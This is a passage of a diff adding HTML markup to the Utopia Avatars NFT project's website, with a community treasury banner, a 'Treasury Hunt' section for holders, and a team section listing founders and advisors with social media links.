+                    <source src="https://utopia.io/video/Fondo+Community+Treasury+1920X1080-1.m4v" type="video/mp4">
+                  </video></div>
+                <div class="top-0 bottom-0 left-0 right-0 w-full h-full absolute z-20 absolute bg-[#00000073] "></div>
+              </div>
+              <div class="h-full bg-black pt-20 lg:pt-24  mx-auto z-30 flex flex-col items-center justify-center">
+                <section class="text-gray-800 text-center z-10 pb-20 px-0 xl:px-64">
+                  <h2 class="px-2 shadow-utopia text-[#C205D9] font-semibold text-[38px]">Utopia Avatars</h2>
+                  <div class="mt-4 md:mt-8"><span
+                      class="bg-[#C205D9] rounded-full  px-8 py-1  text-white text-2xl uppercase text-[22px] iphone:text-[25px] md:text-[30px] lg:text-[35px] xl:text-[45px]">Community
+                      Treasury</span></div>
+                  <div class="amount mt-12"><span
+                      class="font-bold  text-white text-5xl iphone:text-6xl md:text-8xl lg:text-9xl xl:text-[150px]">$240,102.42</span>
+                  </div>
+                </section>
+              </div>
+            </div>
+          </div>
+          <div id="treasuryHunt" class="relative z-10">
+            <div
+              class="h-screen relative py-8 px-4 lg:px-10 flex flex-col items-center lg:flex-row bg-treasury-hunt-bg md:bg-treasury-hunt-bg-md lg:bg-treasury-hunt-bg-lg 3xl:bg-treasury-hunt-bg-xl bg-no-repeat bg-cover bg-center">
+              <div class="text-white text-center flex flex-col items-center justify-center">
+                <div class="w-full max-w-lg mx-auto flex flex-col items-center justify-center gap-4 md:gap-6">
+                  <h2 class="uppercase text-5xl xl:text-6xl font-bold">TREASURY HUNT</h2>
+                  <p class="text-sm md:text-base">Our Founders and first members created <span class="font-bold"> 7
+                      Chests </span> containing <span class="font-bold">22 gifts</span> to be discovered together in our
+                    community as the year Utopia Avatars concept was originated.</p>
+                  <p class="text-base sm:text-xl"><span class="font-bold">Just for holders.</span></p>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div id="team" class="relative  bg-black z-10">
+            <div class="z-0 absolute h-full bg-fixed w-full">
+              <div style="width: 100%; height: 100%;"><video loop="" muted="" autoplay="" playsinline=""
+                  preload="metadata" id="bgvid" class="z-0 absolute h-full bg-fixed w-full backgroundIsCenterMobile">
+                  <source src="https://utopia.io/video/Video_UTOPIA_web_v22.mp4" type="video/mp4">
+                </video></div>
+              <div class="top-0 bottom-0 left-0 right-0 w-full h-full absolute z-20 absolute bg-[#00000073] "></div>
+            </div>
+            <div class="h-full bg-black pt-20 lg:pt-24 px-5 2xl:px-28 mx-auto z-30 flex flex-col">
+              <section class="text-gray-800 text-center pb-20 px-0 xl:px-10 2xl:px-0 z-10">
+                <div>
+                  <div style="opacity: 1; transform: translateX(0px);">
+                    <div class="text-center flex justify-center">
+                      <div class="flex gap-5 mb-6 mb-6 md:mb-8 lg:mb-12">
+                        <h2
+                          class=" font-medium  text-white uppercase z-10 text-4xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                          Our</h2>
+                        <div class="border-r border-white z-50 h-auto"></div>
+                        <h2
+                          class=" font-medium  text-white uppercase z-10 text-4xl md:text-5xl lg:text-5xl xl:text-5xl 2xl:text-6xl">
+                          Team</h2>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div
+                  class="flex flex-wrap lg:flex-nowrap w-full overflow-x-auto justify-center md:justify-start xl:justify-center team-scroll py-10 gap-4">
+                  <div class="md:flex-auto lg:flex-initial">
+                    <div
+                      class="lg:h-full mb-10 lg:mb-0 grid grid-cols-1 md:grid-cols-2 lg:flex flex-wrap lg:flex-nowrap flex-[0_0_100%] lg:flex-col lg:flex-initial md:px-2 xl:px-6 2xl:px-10 3xl:px-14 gap-6 md:gap-14  lg:min-w-[360px] xl:min-w-[auto]  lg:border-r-2"
+                      style="opacity: 1; transform: translateX(0px);">
+                      <h3
+                        class="col-span-1 md:col-span-2 md:flex-auto lg:flex-initial text-2xl 2xl:text-4xl font-semibold uppercase md:mb-10 lg:-mb-2 xl:-mb-2  text-white ">
+                        Founders</h3>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/founders/NinoSaez5.jpg"
+                              class="rounded-full object-cover w-28 h-28 lg:w-[88px] lg:h-[88px] "></div>
+                          <div class="text-left px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Nino Saez</h5>
+                            <ul class="list-inside gap-3 flex mx-auto justify-start"><a
+                                href="https://twitter.com/niinosaez" target="_blank" rel="noreferrer"><svg
+                                  stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512"
+                                  class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z">
+                                  </path>
+                                </svg></a><a href="https://www.instagram.com/niinosaez/?hl=en" target="_blank"
+                                rel="noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
+                                  viewBox="0 0 448 512" class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z">
+                                  </path>
+                                </svg></a></ul>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/founders/MariaBravo.jpg"
+                              class="rounded-full object-cover w-28 h-28 lg:w-[88px] lg:h-[88px] "></div>
+                          <div class="text-left px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Maria Bravo</h5>
+                            <ul class="list-inside gap-3 flex mx-auto justify-start"><a
+                                href="https://twitter.com/MariaRBravo?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor"
+                                target="_blank" rel="noreferrer"><svg stroke="currentColor" fill="currentColor"
+                                  stroke-width="0" viewBox="0 0 512 512" class="text-xl text-white" height="1em"
+                                  width="1em" xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z">
+                                  </path>
+                                </svg></a><a href="https://www.instagram.com/mariarbravo/?hl=en" target="_blank"
+                                rel="noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
+                                  viewBox="0 0 448 512" class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z">
+                                  </path>
+                                </svg></a></ul>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/founders/JavierGarcia2.jpg"
+                              class="rounded-full object-cover w-28 h-28 lg:w-[88px] lg:h-[88px] "></div>
+                          <div class="text-left px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Javier Garcia</h5>
+                            <ul class="list-inside gap-3 flex mx-auto justify-start"><a
+                                href="https://twitter.com/jvgarp" target="_blank" rel="noreferrer"><svg
+                                  stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512"
+                                  class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z">
+                                  </path>
+                                </svg></a><a href="https://www.instagram.com/jvgarp_utopia/?hl=es" target="_blank"
+                                rel="noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
+                                  viewBox="0 0 448 512" class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z">
+                                  </path>
+                                </svg></a></ul>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="md:flex-1 lg:flex-initial">
+                    <div
+                      class="h-full flex md:flex-1 lg:flex-initial md:px-2 xl:px-6 2xl:px-10 3xl:px-14 flex-col gap-4 md:gap-4 lg:min-w-[390px]  xl:min-w-[auto] md:border-r-2"
+                      style="opacity: 1; transform: translateX(0px);">
+                      <h3 class="text-2xl 2xl:text-4xl font-semibold uppercase mb-3 md:mb-8 2xl:mb-8 text-white ">
+                        Advisors</h3>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/founders/EvaLongoria2.jpeg"
+                              class="rounded-full object-cover w-20 h-20 lg:w-[67px] lg:h-[67px] "></div>
+                          <div class="text-left px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Eva Longoria</h5>
+                            <ul class="list-inside gap-3 flex mx-auto justify-start"><a
+                                href="https://twitter.com/EvaLongoria?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor"
+                                target="_blank" rel="noreferrer"><svg stroke="currentColor" fill="currentColor"
+                                  stroke-width="0" viewBox="0 0 512 512" class="text-xl text-white" height="1em"
+                                  width="1em" xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z">
+                                  </path>
+                                </svg></a><a href="https://www.instagram.com/evalongoria/?hl=en" target="_blank"
+                                rel="noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
+                                  viewBox="0 0 448 512" class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z">
+                                  </path>
+                                </svg></a></ul>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/advisors/1_RANDY.png"
+                              class="rounded-full object-cover w-20 h-20 lg:w-[67px] lg:h-[67px] "></div>
+                          <div class="text-left px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Randi Zuckerberg</h5>
+                            <ul class="list-inside gap-3 flex mx-auto justify-start"><a
+                                href="https://twitter.com/randizuckerberg" target="_blank" rel="noreferrer"><svg
+                                  stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512"
+                                  class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z">
+                                  </path>
+                                </svg></a><a href="https://www.instagram.com/randizuckerberg/?hl=en" target="_blank"
+                                rel="noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
+                                  viewBox="0 0 448 512" class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z">
+                                  </path>
+                                </svg></a></ul>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/advisors/1_BANKS.png"
+                              class="rounded-full object-cover w-20 h-20 lg:w-[67px] lg:h-[67px] "></div>
+                          <div class="text-left px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Faze Banks</h5>
+                            <ul class="list-inside gap-3 flex mx-auto justify-start"><a href="https://twitter.com/banks"
+                                target="_blank" rel="noreferrer"><svg stroke="currentColor" fill="currentColor"
+                                  stroke-width="0" viewBox="0 0 512 512" class="text-xl text-white" height="1em"
+                                  width="1em" xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z">
+                                  </path>
+                                </svg></a><a href="https://www.instagram.com/banks/?hl=en" target="_blank"
+                                rel="noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
+                                  viewBox="0 0 448 512" class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z">
+                                  </path>
+                                </svg></a></ul>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="mb-6 lg:mb-0">
+                        <div class="rounded-lg flex">
+                          <div class="relative overflow-hidden bg-no-repeat bg-cover"><img
+                              src="/images/team/advisors/DESIREE.jpg"
+                              class="rounded-full object-cover w-20 h-20 lg:w-[67px] lg:h-[67px] "></div>
+                          <div class="text-left px-4 lg:px-6">
+                            <h5 class="text-lg text-white font-semibold mb-1 lg:mb-1 2xl:mb-2">Desiree Ansari</h5>
+                            <ul class="list-inside gap-3 flex mx-auto justify-start"><a
+                                href="https://twitter.com/desi_babyyy?s=21&amp;t=EwLScZB8jhmQzKnUCXScYA" target="_blank"
+                                rel="noreferrer"><svg stroke="currentColor" fill="currentColor" stroke-width="0"
+                                  viewBox="0 0 512 512" class="text-xl text-white" height="1em" width="1em"
+                                  xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z">
+                                  </path>
+                                </svg></a><a href="https://instagram.com/desireeansari?igshid=YmMyMTA2M2Y="
+                                target="_blank" rel="noreferrer"><svg stroke="currentColor" fill="currentColor"
+                                  stroke-width="0" viewBox="0 0 448 512" class="text-xl text-white" height="1em"
+                                  width="1em" xmlns="http://www.w3.org/2000/svg">
+                                  <path
+                                    d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z">
+                                  </path>
+                                </svg></a></ul>
+                          </div>
+                        </div>
+                      </div>
